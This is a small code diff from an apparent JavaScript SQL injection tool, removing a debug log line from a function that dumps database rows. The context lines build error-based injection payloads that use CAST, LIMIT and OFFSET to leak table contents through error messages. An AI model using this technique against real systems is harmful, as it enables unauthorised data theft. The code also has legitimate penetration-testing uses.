@@ -91,7 +91,6 @@ async function dumpRows(setting, query, name, valueBase, c, tblList) {
 		for (let rowIndex = 0; rowIndex < MAX_ROWS; rowIndex++) {
 			const injection = ` AND 1=CAST((SELECT ${rowExpr} FROM ${table.tblName} ORDER BY 1 LIMIT 1 OFFSET ${rowIndex}) AS int)-- 42`;
 			const payload = `${valueBase}${c}${injection}`;
-			console.log(payload);
 			const params = mutateQuery(query, name, payload);
 			const res = await sendRequest(setting, params);
 			const raw = parseError(res.body);
